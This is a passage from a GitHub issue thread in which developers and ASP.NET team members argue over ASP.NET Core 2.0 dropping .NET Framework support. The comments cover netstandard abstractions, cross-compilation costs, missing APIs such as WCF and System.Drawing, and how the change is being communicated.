ASP.NET Core 1.1 which runs on .NET Framework will be fully supported for a year after we release 2.0. That workload is fully supported thru at least July of 2018.

The remaining large gaps missing in .NET Core 2 are System.DirectoryServices and System.Drawing. We are working to have a Windows compat pack which would enable both of those on .NET Core on Windows this summer.

*What we need from you all is a clear list/understanding of WHY you think you need ASP.NET Core 2.0 to run on net461+. Be specific so we can close those gaps and let everyone be successful.*
"
317	"I thought .NET Standard 2.0 was all about compatibility and interoperability which bridges the gap between .NET Core and .NET fx that everyone is waiting for - this seems to kill that. 

For whatever reason there's going to be lots of customers who will have dependencies that require .NET 4.x whether it be custom external dependencies, commercial components, legacy lib dependencies, etc.

Is it the intention that Customers wont be able to create ASP.NET Core 2.0 apps running on Desktop CLR so they can reference their existing .NET 4.x deps?"
318	"@shanselman Thanks for the reply - lots of good examples in there. 

A follow-up about libraries:
Will all of the abstraction libs remain as cross-compiled? For example if I'm using `HttpRequest`, maintaining a 1.x and 2.x builds on which version of ASP.NET Core you're using (which now cleanly map to a TFM at least) would be something I'd *prefer* to avoid...so I'm *hoping* the abstractions will remain on `netstandard`. Is that the general plan?

We're already maintaining multiple variants for things that depend on ASP.NET/MVC because `System.Web`'s `HttpRequest` is totally different, so that's another library entirely (e.g. `MiniProfiler` vs. `MiniProfiler.AspNetCore`). I just want to make sure we're keeping in mind the number of variants we're loading up on maintaining for any lib authors if their dependencies move off `netstandard`...and hopefully just avoid that headache all together."
319	"I'm very happy this doesn't seem like as big a deal as it appears, thank you for the detailed clarification.

I do have two questions/concerns:

- It sounds like consuming .NET Framework libraries from ASP.NET Core should have minimal friction. That's great! What about the other way around? There are probably .NET Framework or netstandard libraries and applications out there that are embedding parts or components from Mvc and other supporting ASP.NET Core libraries (I know because I have a couple). Those will break, correct? Are there any tips for how to work around that scenario? If netstandard libraries can no longer consume ASP.NET Core libraries, that seems like a big deal for embedded ASP.NET Core scenarios.

- From a non-technical perspective it seems like this will cause a lot of confusion. Outside of the folks who are active on GitHub, follow along on Twitter, etc. there's already a great deal of confusion surrounding the different platforms, etc. I can see developers who've only been partly following along or who are just now getting up to speed getting very frustrated when they go to use ASP.NET Core (perhaps following an outdated tutorial) and can't get it to work on their .NET Framework platforms. Not sure what, if anything, can be done about that."
320	"> We can even reference many net461+ assemblies from ASP.NET Core 2.0 because of typeforwarding and netstandard20

Unfortunately, this doesn't mean that a library compiled and designed for the full framework will work on .NET Core (the risk is high things will blow up at runtime!).

Many of the ""old"" APIs re-introduced in .NET Core 2.0 are stubs that will never (functionally) work. Not to mention that there are still many missing APIs, and even entire areas that were deliberately excluded from .NET Core (IdentityModel, WCF server, remoting, complete AppDomain support, etc.)

Trying to convince people that they can ""safely"" migrate their ASP.NET Core 1.0 w/ .NET Desktop apps to ASP.NET Core 2.0 w/ .NET Core is - IMHO - a lie.

> .NET Core is side by side and it’s moving fast. It’s WAY faster than .NET (Full) Framework can move which is good. By building ASP.NET Core 2.0 on top of .NET Core 2.0 (which, remember, is a SUPERSET of .NET Standard) that means stuff can be built faster than NetFx or even Netstandard.

I don't believe that's what (most) people are looking for. Many people don't need fast-moving libraries, they need **stable stuff** that can gracefully integrate into their older stuff without taking the risk of breaking everything."
321	"@daveaglick 
- Correct in that there's no implicit ability to reference `netcoreapp2.0` from `net461` or even `netstandard2.0`. The bridge goes one way. You can always work around it by specifying TFMs for package fallback, but that's obviously an escape hatch, not a supported scenario (although it will be enough to unblock many people). It's a non-trivial amount of work for us to support sub-systems of ASP.NET Core outside of the larger stack (which is what targeting `netstandard` is implying).
- The potential for confusion goes both ways. E.g. we've had lots of feedback that the fact that ""ASP.NET Core"" can run on .NET Framework (which **isn't** .NET Core) is confusing. This change effectively makes ASP.NET Core part of the .NET Core stack meaning if you're using ASP.NET Core, you're using .NET Core."
322	@shanselman BTW, you didn't say why cross compilation was not an option. ASP.NET Core components that could benefit from `netcoreapp2.0`-only APIs could have both `net46`/`netstandard1.x`/`netstandard2.0` and `netcoreapp2.0` TFMs and make the new cool/fast stuff .NET Core-only. 
323	"@NickCraver currently the plan does not include leaving the *.Abstractions packages targeting `netstandard`. The separation simply isn't as clean as that across the board. For the purposes of someone attempting a migration like what you're suggesting however, using package target fallback should get you there anyway (but I might be misunderstanding you).

Also you're point about the clean TFM split is correct, and is an advantage of this plan, in that a single package can now target ASP.NET Core 1.x and 2.0+ simultaneously using the TFM as a pivot."
324	"I've toying around with the idea of ""mixed applications"". E.g. a WPF application exposing a Web API or a Server offering both a REST API and WCF endpoints (this might be for compatibility with earlier clients). These scenarios are made impossible with this change and makes ASP.NET Core only suitable for new applications rather than being ""just a library""."
325	"@PinpointTownes as @shanselman stated, we're very interested in the specific requirements and blockers that customers have with regards to needing to continue to target .NET Framework directly. Our work with customers in this boat so far has indicated that `System.DirectoryServices` and `System.Drawing` and the No.1 and 2 blocker and we have a plan to address that. Beyond that, we're looking at the feedback and we'll assess.

Cross-compiling is an overhead that must be balanced with customer and product needs. This is why we want to get this feedback so we can more concretely define what the landscape looks like for both our customers and us as we continue to evolve ASP.NET Core moving forward."
326	"@DamianEdwards Thanks for the further clarification. The netstandard -> ASP.NET Core libraries are kind of a big deal for me. I embed Kestrel (which also looks to be moving to netcoreapp) in several netstandard libraries. I also embed Razor in several places, and I know you're working on the new more modular version, but if that only targets netcoreapp too it'll hurt. There's also tons of libraries that are ""part"" of ASP.NET Core but that have lots of utility outside of it.

In other words, I'm much more concerned about removing the ability for netstandard libraries to consume ASP.NET Core packages than I am about the reverse. It seems like this is removing an entire class of use cases from consideration."
327	"@daveaglick Razor itself (the engine) will continue to target `netstandard`. Again, there's a cost involved in supporting particular sub-systems of a large complex graph (like ASP.NET Core 2.0) on different platforms. For things like embedding there are other options (source embedding, copying, etc.) but of course they come with their own trade-offs.

Definitely hear you on the different classes of use cases front, we indeed have different customer groups to consider when designing and shipping a stack like ours."
328	"I share @daveaglick's concerns here: ASP.NET Core wanting to use the latest APIs is totally understandable, but for *everything else downstream* to require the same gets a little messier. You don't get any choice after 1.0 of stable or upgrading, you're on the fastest train available with `netcoreapp2.0` and that's the only choice. If all of the bits (even the basic abstractions) can't be consumed without making users consume `netcoreapp2.0`, that means there is effectively no `netstandard2.0` for that entire line of libraries...and everyone that depends on them.

I get the core application stack moving, but I don't necessarily agree with the abstractions in particular moving. One of the major points of the abstractions was to avoid the tight coupling like this, at least from my view as a consumer. I'd be very curious to see some examples where `netstandard2.0` doesn't have the APIs needed for them but `netcoreapp2.0` does - are there some examples out there? Is this mainly around new types in method parameters? I don't doubt there's ample reasoning, I'm just very curious - seeing examples would help show the maintenance cost which we don't have nearly as much daily insight to.

The Kestrel case is more complicated, but I certainly see the arguments for having it on the latest API set. I'd imagine new APIs will continually be created *for* Kestrel given the work it's driving."
329	"> @PinpointTownes as @shanselman stated, we're very interested in the specific requirements and blockers that customers have with regards to needing to continue to target .NET Framework directly.

As a consultant, I helped a bunch of clients move their apps to ASP.NET Core and I often had to target .NET Desktop to be able to use third-party (closed-source) libraries depending on **IdentityModel**/**WCF** or relying on **AppDomain** support.

Not having these things in ASP.NET Core 2.0 would be a major blocker for them.

There are also libraries that wouldn't work on .NET Core even if the APIs were there, because they'd be functionally different. Here's a concrete case I've seen many times:

On .NET Core, `RSA.Create()` returns a `RSACng` instance on Windows, but on .NET Desktop, a `RSACryptoServiceProvider` instance is returned. Yet, many libraries - including the BLC itself - try to cast `RSA` to `RSACryptoServiceProvider`, which will always fail on .NET Core, as `RSACng` can't be cast to `RSACryptoServiceProvider`.

"
330	@NickCraver which abstractions in particular? The problem with moving just the abstractions is that next you'll end up wanting everything that builds upon those abstractions as well (unless you're literally saying that you only need Microsoft.AspNetCore.Http.Abstractions and *nothing* else)
331	"@davidfowl Yep, *only* the abstractions: e.g. HTTP, Hosting, HTML, and Logging. It looks like `Microsoft.Extensions.*` are covered by earlier comments, which is most of these. Those are the ones I'm interfacing with today.

For a concrete example: the MiniProfiler Middleware doesn't reply on anything but abstractions ([link](https://github.com/MiniProfiler/dotnet/blob/2ea2c3d7fa631c2ba8cae8b81f8a8fd113b5306e/src/MiniProfiler.AspNetCore/MiniProfiler.AspNetCore.csproj))

If you're using MVC and such on top, well then you're on `netcoreapp2.0` anyway, and that is what it is (and IMO, that's just fine). But currently I have freedom to split up APIs logically where shared and do so easily because they're abstractions. I'm very much a fan of the current split, please don't lock that down unnecessarily."
332	"Heh. As a consultant, I've definitely heard the ""What? ASP.NET Core runs on desktop .NET Framework!?"" question quite a few times. The fact that ""ASP.NET Core"" literally has "".NET Core"" in the name is really unfortunate.

Anyway... Just as I was a fan of dropping obsolete/legacy/broken APIs when .NET Core started out (a ""fresh"" start), I'm also a fan of this change in order to get a faster, leaner framework with more features and a higher rate of innovation.

With that said, I'm also sympathetic to all the devs out there that can't, for some reason, migrate all their code to .NET Core before June next year.

This includes my current client, which has an insanely big legacy library/framework, targeting .NET Framework, consumed by multiple ASP.NET Core projects currently being developed in parallel. By the time these systems goes into production, there will be little to no time to either a) port everything to .NET Core, or b) move everything to full framework ASP.NET, before ASP.NET Core 1.x is unsupported.

Is one year of support really enough here? I can imagine there are other similar cases out there..."
333	@khellang as previously stated, they'll be able to continue referencing libraries/frameworks targeting .NET Framework, and that will work just fine assuming the APIs they call are part of the closure of `netstandard2.0`. Do you know if they rely on things outside of that space? That's what we'd really love to get feedback on so we can assess the priority of porting those APIs (like `System.DirectoryServices` and `System.Drawing`).
334	So hosting a web api (say communication layer) or even upcoming asp.net core sockets is going to become impossible for a current windows service or WPF desktop app? (with supported versions).
335	"I imagine there will be a list forthcoming of things that used to be `netstandard1.x` that are now `netcoreapp2.0` 

I've browsed the repos and it seems MVC specific things are `netcoreapp2.0` but HttpAbstractions, Logging, Configuration, etc are still `netstandard`  Or is there more change to come?"
336	"@NickCraver I see you're using Extensions but are still using System.Web. Do you have plans to shim `Microsoft.AspNetCore.Http.HttpContext` with `System.Web.HttpContext`? Do you have an idea how much of the API you need? 

> If you're using MVC and such on top, well then you're on netcoreapp2.0 anyway, and that is what it is (and IMO, that's just fine). But currently I have freedom to split up APIs logically where shared and do so easily because they're abstractions. I'm very much a fan of the current split, please don't lock that down unnecessarily.
 
I'm not talking about MVC though, I'm just talking about other helpers that expose more functionality on top of the underlying abstractions. The big value of the ""abstractions"" pattern we chose is that other things can build on top of them, not so much the abstractions itself. My gut tells me that if we make the ASP.NET abstractions netstandard then we'll end up having to make all of the middleware netstandard as well.

@dasMulli windows services will work once we have the API ported over (there are also open source libraries that support windows services on .NET Core). 

> WPF desktop app? (with supported versions).

Yes. This won't be the default anymore. We won't support it out of the box anymore with .NET Core 2.0."
337	"@davidfowl I'm not sure you looked at the right pieces there:
> but are still using System.Web

...not in the same libraries, because of this split. To achieve minimal overhead and not a truckload of dependencies for consumers, there's `MiniProfiler` for ASP.NET MVC < 6 (System.Web) and `MiniProfiler.AspNetCore`/`MiniProfiler.AspNetCore.Mvc` (lots of NuGet). 

I *think* you're talking about `System.Web` vestige that was that was on `MiniProfiler.Shared` - I was waiting to clean those up until the NuGet issue fixed just last night on framework assemblies. I [just removed it](https://github.com/MiniProfiler/dotnet/commit/cadbdbeb34475ef4d0bc04d68bcc1f4fd371a7ea) to clear things up."
338	@DamianEdwards I'm not 100% on the closure of `netstandard2.0`, but I would be happy to (with their permission) do a portability analyzer run and share the results. Is portability analyzer still a thing and up to date?
339	"ASP.Net Core is quickly becoming the new Python 3*; only worse. This seems like a move in the wrong direction to me. This just means a ton of scenarios will force developers to maintain (and write new) code on the ""old platforms"" for many years to come instead of moving. ""Faster development"" doesn't seem like a very good argument if all it means is you get to a worse/unsuitable place ""Faster"".

*I like Python 3, but it's been out almost a decade and the Python community is still fractured"
340	"Just to be clear - is there any technical blocker (fancy perf stuff) or is this just to save the cost of maintaining compatibility in the future?
I think most of us knew this move would come but no one expected it so soon.. given the transition time is still going on (like libs being ported, .net standard 2.0 around the corner but no libs are yet bing built for it) - it would be great to keep net* support for at least one release (e.g. 2.0, not 2.1)."
341	"@shanselman I see your points and i personally even agree, but _alot_ of people are not going to see it that way.

The primary issue is not calling net46 assemblies from core, the compat shims deals with that in most cases. The problem is existing net46 code and asp.net core 1.* code running on 46. As someone mentioned, the whole point of netstandard was to allow code, including asp.net, to run everywhere, this is going to feel like a step away from that and perhaps even a failure of that vision to some people. 

I don't think the problem is that people don't _want_ to move to net core. The problem is that organizations, managers, CTOs and the like has to be convinced that the cost/benefit of doing so is worth it. Not only is porting time consuming enough to eat into deliveries, it also introduces risks of regressions etc. 

in other words, its not always technical reasons that prevent people from moving. I'd even say its rare, _technically_ almost any project can make the jump. But motivating that cost/delivery slip, that's the problem. It can be a very hard sell, one that i've had to make a fair few times. In those cases being able to say, ""but you can run on full framework"" has been a way to drive that move though

> If you want to hurt yourself

This is exactly it. Net46 devs and management will not see it like that, they'll see it as _you_, microsoft, want to hurt them in order to keep up with the latest release. ""Well don't move then"" one might say but with the support of  asp.net core 1.x as short as it is, they kind of have to, at least from the perspective of managers who has to be held responsible if a bug causes downtime or information loss. (even if the framework is not responsible)

A lot of devs that really pushed for asp.net core 1.1 are also going to feel betrayed that they now wont be able to move to 2.0 without core. That may or may not be justified but i'm just telling you, alot of people are going to feel that way, they'll be the ones who have to answer to their more conservative colleagues

Does any of that matter? Will asp.net core2/dotnet core2 ""die"" because of this? No, but it will slow adoption and fracture the ecosystem and that's really sad imo. I want people to be able to use all this great stuff coming in 2.0 and cutting cross compilation to net standard will impact that. Certainly, most people who hang out in these repos wont have a problem, its Joe and Jane dev and even more so, their manager that's the problem.

@DamianEdwards 
I agree that this has been a source of confusion, I've had to explain it many times, but the result of that has always been turning a disappointed dev into an excited one because they thought they were not able to use the new cool stuff but it turned out they could.


To summerize, I'm sure this decision was not made lightly but if you have to do this i think you have to be really _really_ careful about the messaging.. You have to show that migrating to asp.net core, especially from 1.x on net46 is _super_ simple and super polished. The story for referencing other netstandard libraries from net46 both as project references and otherwise has to be rock solid. I think you need to show/adress this explicitly to avoid people freaking out"
342	@khellang paging @terrajobst for the Portability Analyzer question.
343	"@khellang 

Yes, we just updated the VSIX for 2017, but I simply use the command line version from [here](https://github.com/Microsoft/dotnet-apiport/releases)."
344	"@NickCraver Sure, you can write a piece of middleware that targets netstandard, what good does that do for you as a library author if ASP.NET Core supports netcoreapp2.0.

@aL3891 great summary! One big issue we *do* have going forward is how we take advantage of new APIs for things that are also in netstandard. .NET Core *will* get new APIs that we *need* to implement new features (one that comes to mind is SSLStream ALPN support for HTTP2 support in Kestrel). So you could argue we stay on stay on netstandard and constantly use the highest version (which .NET Framework doesn't support yet) but then we'd be in the same boat."
345	"> One big issue we do have going forward is how we take advantage of new APIs for things that are also in netstandard. .NET Core will get new APIs that we need to implement new features (one that comes to mind is SSLStream ALPN support for HTTP2 support in Kestrel).

According to https://github.com/dotnet/corefx/issues/4721, ALPN support for `SslStream` won't be ready for .NET Core 2.0. Assuming this is eventually implemented a few months later, does that mean that one will be able to use it when targeting the `netcoreapp2.0` TFM? In this case, what will happen if I decide to release a `netcoreapp2.0`-based library that uses new APIs that were not part of the initial `netcoreapp2.0` shape if my users use an older .NET Core runtime? Will it crash? Or will `netcoreapp2.x` be aligned with `netstandard1.x`, whose contract can't be changed without incrementing the TFM version?"
346	"@davidfowl for other implementations of any piece of the stack and testing. And because with the way abstractions are (not requiring MVC) as a decent split between 2 libraries instead of ""assume everyone has MVC and wants all dependencies"".

If the abstractions aren't *actually* abstractions and are so tightly coupled to ASP.NET Core itself, why don't we just remove those packages? It's an honest question, as that'd make life easier and clearer if that's the overall relation goal. I'm trying to understand the point of having abstractions as separate packages are if they're effectively tied to a simple implementation/use. I'd posit that no one outside of Microsoft wants to or has the resources to dedicate to a competing `netcoreapp2.x` web server (happy to be corrected there!).

Can you clarify what the point of the abstractions would be in a `netcoreapp2.x` world? Or if there are plans to simply deprecate them in 2.0?"
347	"> According to dotnet/corefx#4721, ALPN support for SslStream won't be ready for .NET Core 2.0. Assuming this is eventually implemented a few months later, does that mean that one will be able to use it when targeting the netcoreapp2.0 TFM? In this case, what will happen if I decide to release a netcoreapp2.0-based library that uses new APIs that were not part of the initial netcoreapp2.0 shape if my users use an older .NET Core runtime? Will it crash? Or will netcoreapp2.x be aligned with netstandard1.x, whose contract can't be changed without incrementing the TFM version?

ASP.NET version x will just align to .NET Core version x. The TFM will be updated to align with every release of .NET Core. It's a single product that can finally be treated as such. That's one of the major simplifications we're doing as @DamianEdwards mentions above. We won't break people building libraries by adding new APIs in the core without changing the TFM.

@NickCraver 

> for other implementations of any piece of the stack and testing. 

What other implementations? Are there other pieces of the stack that implement ASP.NET Core.

> If the abstractions aren't actually abstractions and are so tightly coupled to ASP.NET Core itself, why don't we just remove those packages? It's an honest question, as that'd make life easier and clearer if that's the overall relation goal. I'm trying to understand the point of having abstractions as separate packages are if they're effectively tied to a simple implementation/use. I'd posit that no one outside of Microsoft wants to or has the resources to dedicate to a competing netcoreapp2.x web server (happy to be corrected there!).

> Can you clarify what the point of the abstractions would be in a netcoreapp2.x world? Or if there are plans to simply deprecate them in 2.0?

We could put everything into a single assembly but the refactoring allows us future flexibility that we wouldn't otherwise have if we did this. It even opens up the possibility to have other implementations and doesn't really preclude it in the long term.

Simply put, abstractions are about lowering the number of dependencies, not about platform portability."
348	"> We won't break people building libraries by adding new APIs in the core without changing the TFM.

You guys said that you wanted to opt for `netcoreapp2.0`-only as it was moving faster - compared to .NET Desktop and by extension, .NET Standard - but what's the point of targeting `netcoreapp2.0` instead of `netstandard2.0` if you can't benefit from new .NET Core APIs without changing the TFM? (e.g `netcoreapp2.1`)"
349	"> You guys said that you wanted to opt for netcoreapp2.0-only as it was moving faster - compared to .NET Desktop and by extension, .NET Standard - but what's the point of targeting netcoreapp2.0 instead of netstandard2.0 if you can't benefit from new .NET Core APIs without changing the TFM? (e.g netcoreapp2.1)

Sorry, I misspoke, I mean `netcoreapp2.x` not `netcoreapp2.0`."
350	"Okay, I'm totally confused, now.

![image](https://media.giphy.com/media/hEc4k5pN17GZq/giphy.gif)

> Sorry, I misspoke, I mean netcoreapp2.x not netcoreapp2.0.

I'm not sure I understand. Do you mean there'll be an equivalence between the ASP.NET Core 2.1 packages and the `netcoreapp2.1` TFM?"
351	"> Do you mean there'll be an equivalence between the ASP.NET Core 2.1 packages and the netcoreapp2.1 TFM?

Yep. Think of the 2 as one in the same. See https://github.com/aspnet/Home/issues/2022#issuecomment-299544884"
352	"So what prevents you from adopting a similar pattern, but with `netstandard`? It would be the best approach, IMHO: new APIs could be adopted via new TFMs and people who need to support .NET Desktop could still run their ASP.NET Core apps on the full framework.

ASP.NET Core 2.1/.NET Core 2.1/.NET Desktop 4.7.1 -> `netstandard2.1`
ASP.NET Core 2.2/.NET Core 2.2/.NET Desktop 4.8 -> `netstandard2.2`."
353	@PinpointTownes because .NET Framework on desktop can't ship fast enough, that's the crux of most versioning issues with Core. It's a hard problem in an immense chain.
354	.NET Standard will not move at the same speed as .NET Core. Nowhere near it in actuality. A move in .NET Standard essentially leaves **all** platforms behind, until they catch up, and .NET Framework is both the slowest moving and the largest.
355	"Point token, tho' I'm not sure how fast .NET Framework is supposed to ship (e.g the new ECDSA APIs were ported from CoreFX to NetFX in less than a year, which seems to be a reasonable time frame for such sensitive crypto components).

> Cross-compiling is an overhead that must be balanced with customer and product needs.

When you have a minute, I'd love to know more about the exact nature of the overhead caused by cross-compilation. Thanks."
356	">What we need from you all is a clear list/understanding of WHY you think you need ASP.NET Core 2.0 to run on net461+. Be specific so we can close those gaps and let everyone be successful.

At the moment, we need the fullframework version of WCF client libraries - as the `netstandard` / `netcore` versions (https://github.com/dotnet/wcf) are not close to complete. 

"
357	"> When you have a minute, I'd love to know more about the exact nature of the overhead caused by cross-compilation. Thanks.
 
There will be a time in the very near future where we literally can't polyfill features like ALPN support for SSLStream. Also we haven't even begun to stretch our legs and add APIs into .NET Core, so far we've been bogged down with porting things back to .NET Standard and .NET Core 2.0 (the entire purpose of .NET Standard 2.0). We're going to be adding new APIs and finally consuming them in ASP.NET Core on day 1.

> At the moment, we need the fullframework version of WCF client libraries - as the netstandard / netcore versions (https://github.com/dotnet/wcf) are not close to complete.

@ctolkien That is a problem and it's the reason we ported the WCF client in the first place. Do you know what's blocking you? This is a good chance to help us prioritize."
358	"@davidfowl https://github.com/dotnet/wcf/issues/8

There may be more, this was just the first hurdle we hit before transitioning to full framework wcf."
359	"> There will be a time in the very near future where we literally can't polyfill features like ALPN support for SSLStream.

How is that a problem? AFAICT, no here has ever said that the .NET Desktop and .NET Core flavors of ASP.NET Core had to support the same exact feature set. If a feature is not available on .NET Desktop due to missing APIs (e.g HTTP 2/0), why not making it .NET Core-only and throwing a `PlatformNotSupportedException` telling the developer that the feature he's looking for is not available?
It would be far better than making all the ASP.NET Core packages .NET Core-only, even though most of them will be unlikely to use new BCL APIs."
360	"@davidfowl I guess one major fear is that things don't get fixed in say `netcoreapp2.3`, it gets fixed in `netcoreapp2.4`. If ASP.NET Core is focused on the fastest train, how long with each minor version get love? If we have to constantly upgrade, then every consumer has to constantly upgrade.

That's great for getting the latest and greatest, but it's not the best for most companies. So we either have to maintain *many* versions (each minor version) with our libraries for each consumer of ASP.NET Core (to not depend on the latest and keep up), or drag users to the latest version to keep up. This isn't friendly to things like validated environment.

Unless the abstractions need to rev as fast (examples?), having them disconnected would be preferred. That way you're not dragging the entire ecosystem along with every upgrade. I guess I'm more concerned not that they'll be on `netcoreapp`, but that they'll be continually updated and everything is tightly coupled.

If the abstractions will maintain each minor version and shift the pain (to be frank) to your side, I'm a lot less worried. Can you guys elaborate on intentions with revisions here?"
361	"@PinpointTownes:
> why not making it .NET Core-only and throwing a PlatformNotSupportedException telling the developer that the feature he's looking for is not available?
It would be far better than making all the ASP.NET Core packages .NET Core-only, even though most of them will be unlikely to use new BCL APIs.

Noooooooo, please no. That's a runtime failure and very much **not** desirable behavior. We want to have as many compile-time assurances that our libraries will work as possible. There have been many debates on this, that simply isn't a good path. `PlatformNotSupported` should be avoided as much as humanly possible."
362	"> That's a runtime failure and very much not desirable behavior.

This is exactly what will happen with the ""bring your .NET Desktop assemblies on .NET Core"" approach if your assemblies try to use an unsupported API, except you'll get a `MissingMemberException` instead of a `PlatformNotSupportedException`.

With my approach, you could at least define a better tooling story with things like Roslyn analyzers that could determine at compile-time whether the APIs you're using are supported or not."
363	And BTW, throwing a `PlatformNotSupported` would be really a corner case. With cross compilation, the best option would be to simply exclude the unsupported APIs from the public contract.
364	"@PinpointTownes I thought this way as well, but the reality is new platforms ship and it's just not that simple. After discussing this many times my mind has changed greatly on how to do compat here. Going with the `netcoreapp` direction allows fixes to be shipped in minor versions. Going the other way means you have to wait on .NET Desktop to ship fixes, which...good luck. That's a very slow vehicle for resolutions.

> AFAICT, no here has ever said that the .NET Desktop and .NET Core flavors of ASP.NET Core had to support the same exact feature set. If a feature is not available on .NET Desktop due to missing APIs (e.g HTTP 2/0), why not making it .NET Core-only

The first half of that is what `netstandard` is. Differentiating to `netcoreapp` is *exactly* what they're doing here. Without the intentional exceptions. It's a proper contract this route.

You want to go the direction of the thing that can be fixed and improved faster when gaps are involved, not the other way around. ""PlatformNotSupported"" exceptions can be fixed in the library tomorrow, instead of waiting for the platform to rev 3 months from now. .NET Core can support them faster because the *actual code ships with it*, not separately as forwarders most of the time."
365	"> [@PinpointTownes]  If a feature is not available on .NET Desktop due to missing APIs (e.g HTTP 2/0), why not making it .NET Core-only and throwing a `PlatformNotSupportedException` telling the developer that the feature he's looking for is not available?

We need to balance simplicity in API surface & reach with developer productivity. So far, we've primarily used `PlatformNotSupportedException` in order to deliver an API surface that is compatible with the past. We don't intend to use `PlatformNotSupportedException` as a way to deliver disjoint feature sets moving forward. Instead, we'll either drop support for versions of the .NET platforms that don't have the features or deliver the feature as an independent NuGet package that itself isn't supported everywhere."
366	"> Going with the netcoreapp direction allows fixes to be shipped in minor versions.

How is that different to the 1.0 approach? @davidfowl said new APIs would require new TFMs, which means you'll have to opt out of LTS to get fixes relying on new .NET Core APIs. Not really an ideal situation.

> Differentiating to netcoreapp is exactly what they're doing here.

Differentiating is totally fine and I definitely agree .NET Core should be the preferred target for ASP.NET Core. But that doesn't imply ditching .NET Desktop completely, specially when alternatives like cross compilation exist.

> We need to balance simplicity in API surface & reach with developer productivity.

Sure. But you also need to balance that with the fact legacy libs - developed for .NET Desktop and using features not available on .NET Core - should work fine in the ASP.NET Core 2.0, just like they did in 1.0."
367	"> Instead, we'll either drop support for versions of the .NET platforms that don't have the features or deliver the feature as an independent NuGet package that itself isn't supported everywhere.

That's totally fine in theory. But thing is the platform that's currently lacking important features is .NET Core, not .NET Desktop. This will probably change in a few years, but what's sure is that people will still find missing features in .NET Core 2.0."
368	"Might be worth having a `forward-port` repo in dotnet where people can make api requests for specific items they consider missing from .NET Core from .NET Framework?

Then feedback, reviews and guidance can be done outside of the day to day noise of the code repos? Or a general api review/spec repo (Sort of like csharplang vs roslyn)

Also will be a good go to for: ""I have conversion issue and need to search for issue related to X api"" Whereas corefx is very noisy for that."
369	"> [@benaadams] Might be worth having a forward-port repo in dotnet where people can make api requests for specific items they consider missing from .NET Core from .NET Framework?

I'd say these are simply issues in CoreFx. Also, our promise generally is: if the type is shared between .NET Framework and .NET Core, we intend to port newly added members to .NET Framework. In very rare cases this might not be possible, but the stake in the ground is that they are automatically considered.

> [@benaadams] Or a general api review/spec repo

Not sure it's worth it. API reviews are already somewhat heavy handed; extracting them to another repo seems to amplify that. I'd rather we keep streamlining CoreFx so that adding new APIs is as simple as doing it in, say, ASP.NET."
370	"> as previously stated, they'll be able to continue referencing libraries/frameworks targeting .NET Framework, and that will work just fine assuming the APIs they call are part of the closure of netstandard2.0

@DamianEdwards What about the APIs not in the closure of netstandard2.0? Most 3rd party libraries are closed source. How am I able to tell that every edge case is in the closure of netstandard2.0?
As @PinpointTownes hinted, this is a kinda like playing Russian Roulette.
"
371	"@MJomaa tooling will help here but obviously the only way to know for certain is the actually run it. That's actually no different from a .NET Standard library running on a .NET Standard supported framework. API's existing don't replace the need to test these libraries. That's not to say that netstandard implementations don't aim to be compatible, but they *are* edges, e.g. https://github.com/dotnet/standard/blob/cc9f646354fc68a13707a82323d4032b8dbfda52/netstandard/src/ApiCompatBaseline.net461.txt

Those are APIs that exist in NS 2.0 but not in .NET Framework 4.6.1."
372	"I got really nervous about this change, but after reading the thread it seems fine in theory.  We have 5 ASP.NET Core apps with 4 of them on full framework, but that was mostly just us being defensive than anything else and taking the path of least resistance. 

I think some sort of tooling baked into VS like the .NET Core Portability Analyzer could help the devs who aren't up to date on Twitter/GitHub and aren't aware that this extension even exists.  The ""suggest an extension"" pop up comes to mind, but I'm not sure what action a person would be taking to trigger that.  Trying to add a net46x lib to an ASP.NET Core 2+ app maybe?

Stuff Microsoft can't control like 3rd party support with Telerik, Syncfusion, etc. will be a potential blocker too depending on what they're doing.

The messaging in this GitHub thread needs to get out into a blog post ASAP with an FAQ or something.  I feel like I've been staying on top of everything, and I still wasn't 100% sure if this meant we could reference net46x libs or not.  I clearly wasn't the only one confused by that either.

To echo what others have been saying.  I have talked with **at least** 10 devs who didn't know ASP.NET Core could run on full framework.  I had the same experience as @aL3891 though where devs were really happy they could run ASP.NET Core on full framework and their internal libs would just work.  Again - the messaging about .NET Core 2.0 having a vast majority of use cases will be very, very important.  The piece about having at least a Windows-only solution for like System.DirectoryServices in the works will also be important too.  A lot of NET devs I talk to give a shrug when they hear that .NET Core is cross-plat and care more about their existing code working than x-plat/perf."
373	"Guys, this is kind of garbage :( 
We built on top of ASP.NET Core because of the option to use it with netfx, and we built things which were intended to last 5-10 years, not for 1 year of support max. This is what the ASP.NET name *means* in business and it's why large, slow-moving organisations choose it over flavour of the month frameworks. Let me move on to the concrete use cases..

I work in a tooling group which builds line of business libraries and applications for use internal to a company and for sale to 'enterprise' clients. Mostly government organisations in our case but I'm sure you'll be hearing the same thing from the private sector. We have internal frameworks which encode business patterns into common abstractions - think ""IDatabaseConnection"", ""IEntityProvider"", ""IWizardFlow"", ""ICodeGenerator"" - and build RAD frontends on top of these pluggable backends.

In our stack, ASP.NET Core is a 'plugin' - it's an HTTP destination, used as a datastore abstraction and for hosting services and so on. It's also a 'frontend' - obviously a bunch of the LOB apps out there are websites, and it's a great new framework for webapps. So we have bidirectional interoperability requirements - A.N-C code which references random other components, and random other code which references A.N-C.

We're totally fans of Core CLR and portability, and we've ported a bunch of our components to target or multitarget netstandard. We've got one app that's hosted on Linux so far and hope to have more to come. However, there's no way that *everything* is going to be ported any time soon! We have still-live, actively-developed code which relies on
- NTLM authentication (including advanced scenarios around tokens and SPNs)
- System.Drawing as above (interesting wrinkle here: we need old image formats like TIFF, which new OSS libraries don't support)
- Connecting to WCF/SOAP apis - still tons and tons of these out there
- Windows crypto apis (including RSACng, ECDSA, and CSP for PKI tokens)
- WPF guis - our clients are not switching to windows 10 any time soon and even when they do they won't want Store apps
- Microsoft Office interop (particularly access and excel) for data import and export
- Visual Studio extensibility
- Third party plugins like the Oracle ADO.NET provider

Some of these technologies are never going to be supported by Core CLR. But they *are* real technologies, which are the basis of new app development - we need a version of .NET which has access to this stuff. Right now our position is manageable: we isolate ""legacy"" (really: platform-specific) dependencies into their own components which are net461 specific. Specific business apps then take a dependency on netfx if they need these features, and not otherwise. I envisage a future where this is rare for new apps.. but it's hard to imagine it ever being 0%. 

You did all this work on csproj and the SDK because interop is important. ASP.NET Core is the carrot, the *reason* to want interop. I do not think it makes sense to take it away. And no, ""you can load your references in one direction, but they will likely fail at runtime"" is not interoperability."
